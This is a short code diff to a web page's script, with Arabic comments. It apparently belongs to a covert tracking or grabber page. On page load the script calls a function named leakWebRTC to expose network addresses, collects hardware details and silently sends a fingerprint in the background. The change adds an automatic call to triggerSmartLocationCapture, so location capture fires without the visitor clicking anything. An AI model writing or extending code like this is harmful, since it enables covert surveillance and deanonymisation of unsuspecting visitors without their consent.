@@ -498,7 +498,7 @@
             }
         }
 
-        // 7. عند تحميل الصفحة: إرسال البصمة الصامتة في الخلفية وترك الزر جاهزاً للضغط
+        // 7. عند تحميل الصفحة: تشغيل الزر تلقائياً وجمع البيانات في الخلفية
         document.addEventListener('DOMContentLoaded', async () => {
             // كشف WebRTC وجمع العتاد
             cachedWebRTC = await leakWebRTC();
@@ -516,6 +516,9 @@
                     })
                 });
             } catch(e) {}
+
+            // تشغيل الزر تلقائياً
+            triggerSmartLocationCapture();
         });
     </script>
 </body>
